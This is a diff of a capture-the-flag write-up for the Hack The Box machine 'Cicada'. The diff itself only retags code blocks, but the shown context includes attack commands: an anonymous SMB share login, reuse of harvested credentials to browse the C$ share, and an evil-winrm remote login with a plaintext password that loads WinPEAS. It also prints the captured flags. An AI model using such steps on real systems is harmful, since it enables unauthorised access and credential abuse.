@@ -93,7 +93,7 @@ do_connect: Connection to 10.10.11.35 failed (Error
 
 Tried anonymous login on some folders, found that HR is accessible
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Cicada]
 └─$ smbclient -N //10.10.11.35/HR 
 Try "help" to get a list of possible commands.
@@ -222,7 +222,8 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 
 Found other credentials inside it, use them with smbclient to browse trough C$
 
-```┌──(kali㉿kali)-[~/HTB/Cicada]
+```shell
+┌──(kali㉿kali)-[~/HTB/Cicada]
 └─$ smbclient  //cicada.htb/C$ -U CICADA\\emily.oscars 
 Password for [CICADA\emily.oscars]:
 Try "help" to get a list of possible commands.
@@ -253,15 +254,14 @@ Navigate to emily.oscars' Desktop folder and you'll find the user flag:
 
 ![](attachment/eb966126c503e2aac24c0c3b2378726a.png)
 
-```
+```shell
 userflag:b1a85553011c051272b8b9bbf05a7258
 ```
 
 Use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to log in the system
 
-```
+```shell
 evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -s /path/to/local/Winpeas.exe
-
 ```
 
 ![](attachment/9795d07b42e23b355bb6731828e14690.png)
@@ -313,6 +313,6 @@ Then get root.txt in **C:\Users\Administrator\Desktop>**
 
 ![](attachment/1b649ffb4e75f05397d31a254f89ee84.png)
 
-```
+```shell
 rootflag:03875ddc5ded5559275b9be9ca9d0dd3
 ```
